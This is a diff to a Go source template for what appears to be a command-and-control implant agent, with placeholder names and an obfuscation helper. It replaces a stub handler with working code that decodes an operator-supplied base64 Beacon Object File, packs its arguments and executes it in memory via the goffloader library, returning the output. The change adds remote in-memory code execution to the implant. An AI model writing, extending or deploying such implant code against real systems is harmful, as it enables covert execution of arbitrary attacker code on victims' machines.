@@ -21,6 +21,8 @@ import (
 	"unsafe"
 
 	"github.com/fernet/fernet-go"
+	"github.com/praetorian-inc/goffloader/src/coff"
+	"github.com/praetorian-inc/goffloader/src/lighthouse"
 )
 
 // Obfuscation function for runtime deobfuscation
@@ -1400,12 +1402,45 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_BOF_FUNC}(command string) string {
 		bofArgs = parts[2]
 	}
 
-	_, err := base64.StdEncoding.DecodeString(encodedBOF)
+	// Decode the base64-encoded BOF
+	bofBytes, err := base64.StdEncoding.DecodeString(encodedBOF)
 	if err != nil {
 		return fmt.Sprintf("[ERROR] Invalid BOF data format: %v", err)
 	}
 
-	return fmt.Sprintf("[SUCCESS] BOF executed with args: %s", bofArgs)
+	// Parse and prepare BOF arguments using lighthouse module
+	var args []string
+	if bofArgs != "" {
+		// Parse arguments - for now support simple space-separated arguments
+		// In the future, we can support more complex argument parsing
+		argParts := strings.Fields(bofArgs)
+		// For goffloader, arguments need to be prefixed with type specifiers
+		// Common types: 'z' for null-terminated strings, 'i' for integers, etc.
+		for _, argPart := range argParts {
+			args = append(args, "z"+argPart) // Default to null-terminated string
+		}
+	}
+
+	// Pack the arguments using lighthouse
+	argBytes := []byte{}
+	if len(args) > 0 {
+		argBytes, err = lighthouse.PackArgs(args)
+		if err != nil {
+			return fmt.Sprintf("[ERROR] Failed to pack BOF arguments: %v", err)
+		}
+	}
+
+	// Execute the BOF in-memory using goffloader
+	output, err := coff.Load(bofBytes, argBytes)
+	if err != nil {
+		return fmt.Sprintf("[ERROR] Failed to execute BOF: %v", err)
+	}
+
+	if output == "" {
+		return "[SUCCESS] BOF executed with no output"
+	}
+
+	return output
 }
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_PROCESS_ID_FUNC}(processName string) (uint32, error) {
